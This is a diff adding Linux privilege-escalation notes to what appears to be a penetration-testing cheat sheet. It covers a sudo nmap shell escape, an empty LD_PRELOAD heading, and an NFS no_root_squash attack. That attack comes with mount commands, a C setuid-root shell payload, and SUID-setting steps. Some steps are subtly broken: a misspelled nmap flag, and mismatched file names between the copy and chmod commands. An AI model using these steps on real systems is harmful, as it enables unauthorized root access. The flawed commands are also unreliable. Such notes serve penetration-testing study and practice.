@@ -537,6 +537,18 @@ Tips:
 Scripts
 * [Linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
+### SUDO Misconfigurations
+
+NOPASSWD - run Sudo without a password
+```bash
+$ sudo -l                # confirm misconfiguration
+$ sudo nmap --interative # start interactive nmap
+nmap> !sh                # pop root shell
+```
+
+LD_PRELOAD
+
+
 ### SUID / SGID
 
 [SUID3ENUM.py](https://github.com/Anon-Exploiter/SUID3NUM)
@@ -545,7 +557,6 @@ Scripts
 ```
 $ python suid3num.py
 ```
-
 
 ### Running services
 
@@ -603,6 +614,44 @@ Mysql UDF privilege escalation.
 * https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
 * https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/
 
+
+### NFS 'NO_ROOT_SQUASH' Misconfiguration
+
+Exploit NFS shares for privesc.
+
+Discover vulnerability with `cat /etc/exports` and see if a directory is configured as `NO_ROOT_SQUASH`.
+* You can access it from as a client and write inside that directory as if you were the local root of the machine.
+* See https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.
+
+Mount misconfigured directory
+```
+$ showmount -e 192.168.xx.53
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+```
+
+Create payload
+```
+# generic C exploit
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+```
+
+Copy payload -> set SUID bit
+```
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
+```
 
 ## Windows Privilege Escalation
 
